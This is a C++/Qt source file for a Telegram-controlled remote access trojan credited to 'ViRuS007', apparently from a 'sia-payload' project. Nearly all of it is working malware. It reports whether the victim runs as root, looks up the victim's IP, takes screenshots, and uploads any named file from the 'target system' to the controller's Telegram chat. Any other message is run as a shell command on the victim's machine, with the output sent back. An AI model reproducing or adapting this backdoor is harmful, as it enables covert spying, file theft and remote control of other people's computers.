#include <QCoreApplication>
#include <QDebug>
#include <QProcess>
#include <QStringList>
#include <QString>
#include <QByteArray>
#include <QNetworkAccessManager>
#include <QNetworkReply>
#include <QNetworkRequest>
#include <QEventLoop>
#include <QVariant>
#include <QSysInfo>
#include <QFile>
#include <QRegularExpression>
#include "unistd.h"

#include "qttelegrambot.h"

//your bot token
#define TOKEN ""


Telegram::Bot *bot;

void newMessage(Telegram::Message message)
{
    qDebug() << "new message:" << message;

    if (bot && message.type == Telegram::Message::TextType) {

        //regular
        QRegularExpression re("\/down_pic (.*)");
        QRegularExpression re2("\/down_doc (.*)");
        QRegularExpression re3("\/down_vid (.*)");
        QRegularExpression re4("\/down_audio (.*)");
        //match
        QRegularExpressionMatch match = re.match(message.string);
        QRegularExpressionMatch match2 = re2.match(message.string);
        QRegularExpressionMatch match3 = re3.match(message.string);
        QRegularExpressionMatch match4 = re4.match(message.string);

        if (message.string == "/start") {
            if (getuid()) {
                bot->sendMessage(message.chat.id, "Hello " + message.from.firstname + " \n\n☠ Bot is online!\nAccess system is Root? :False\n\n Enter /help to get commands and help.");
            }
            else
            {
                qDebug() << "True";
                bot->sendMessage(message.chat.id, "Hello " + message.from.firstname + " \n\n☠ Bot is online!\nAccess system is Root? :True\n\n Enter /help to get commands and help.");
            }
        }
        //Help command
        else if (message.string == "/help") {
            bot->sendMessage(message.chat.id, "☠ Help:\n"
                             "  /info => To Get ip and system info.\n"
                             "  /screenShot => Get ScreenShot of system(Just linux).\n"
                             "  /down_pic [ name + path ]   => Get Download picture from system target.\n"
                             "  /down_doc [ name + path ]   => Get Download document from target system\n"
                             "  /down_vid [ name + path ]   => Get Download video from target system.\n"
                             "  /down_audio [ name + path ]  => Get Download audio from target system.\n\n"
                             "for run shell command just send without `/` and \nRecive result.\n"
                             "Coded By : ViRuS007\n"
                             "Email : virus007@protonmail.com\n"
                             "Telegram ID : @Msf_Payload\n"
                             "\n"
                             "Github: http://github.com/shayanzare/sia-payload");
        }
        // info command
        else if (message.string == "/info")
        {
            QEventLoop eventLoop;
            QNetworkAccessManager mgr;
            QObject::connect(&mgr, SIGNAL(finished(QNetworkReply*)), &eventLoop, SLOT(quit()));
            QUrl url("http://ipinfo.io/json");
            QNetworkRequest req(url);
            QNetworkReply *reply = mgr.get(req);
            eventLoop.exec();

            //send output to telegram
            bot->sendMessage(message.chat.id, "☠ Result :\n" + reply->readAll());
        }
        //taking screenShot
        // TODO: This Command just for linux
        else if (message.string == "/screenShot") {
            system("import -window root -resize 1360x768 -delay 200 screenshot.png");

            QFile file("screenshot.png");
            if (file.open(QIODevice::ReadOnly)) {
                bot->sendPhoto(message.chat.id, &file);
            }
            else
            {
                qDebug() << "Error to opening file";
                bot->sendMessage(message.chat.id, "☠ Error To Opening File!");
            }
        }
        // Download Picture from target system
        else if (match.hasMatch()) {
            bot->sendMessage(message.chat.id, "☠ Uploading to telegram...");
            QString mached = match.captured(1);
//            qDebug() << mached;
            QFile photo(mached);
            if (photo.open(QIODevice::ReadOnly)) {
                //send to telegram
                bot->sendPhoto(message.chat.id, &photo);
            }
            else
            {
                qDebug() << "Error to opening file";
                bot->sendMessage(message.chat.id, "☠ Error To Opening File!");
            }
        }
        //send document
        else if (match2.hasMatch()){
            bot->sendMessage(message.chat.id, "☠ Uploading to telegram...");
            QString matched = match2.captured(1);
            QFile doc(matched);

            if (doc.open(QIODevice::ReadOnly)) {
                //send to telegram
                bot->sendDocument(message.chat.id, &doc);
            }
            else
            {
                qDebug() << "Error to opening file";
                bot->sendMessage(message.chat.id, "☠ Error To Opening File!");
            }
        }
        //send video
        else if (match3.hasMatch()){
            bot->sendMessage(message.chat.id, "☠ Uploading to telegram...");
            QString matched = match3.captured(1);
            QFile video(matched);

            if (video.open(QIODevice::ReadOnly)) {
                bot->sendVideo(message.chat.id, &video);
            }
            else
            {
                qDebug() << "Error to opening file";
                bot->sendMessage(message.chat.id, "☠ Error To Opening File!");
            }
        }

        else if (match4.hasMatch()) {
            bot->sendMessage(message.chat.id, "☠ Uploading to telegram...");
            QString matched = match4.captured(1);

            QFile audio(matched);
            if (audio.open(QIODevice::ReadOnly)) {
                bot->sendAudio(message.chat.id, &audio);
            }
            else {
                qDebug() << "Error to opening file";
                bot->sendMessage(message.chat.id, "☠ Error To Opening File!");
            }
        }

        //Else for run shell commands
        else
        {
            QProcess process;
//            qDebug() << "[+] Command : " << message.string;
            process.start(message.string);
            process.waitForFinished(-1); // will wait forever until finished

            QString stdout = process.readAllStandardOutput();
            QString stderr = process.readAllStandardError();
//            qDebug() << "stdout: \n" << stdout;
//            qDebug() << "stderr: \n" << stderr;
            bot->sendMessage(message.chat.id, "☠ Result :\n" + stdout + "\n☠ Error :\n" + stderr);

        }
    }
}

int main(int argc, char *argv[])
{
    QCoreApplication a(argc, argv);

    bot = new Telegram::Bot(TOKEN, true, 500, 4);
    QObject::connect(bot, &Telegram::Bot::message, &newMessage);
    qDebug() << "[+] Started Telegram Bot";

    return a.exec();
}
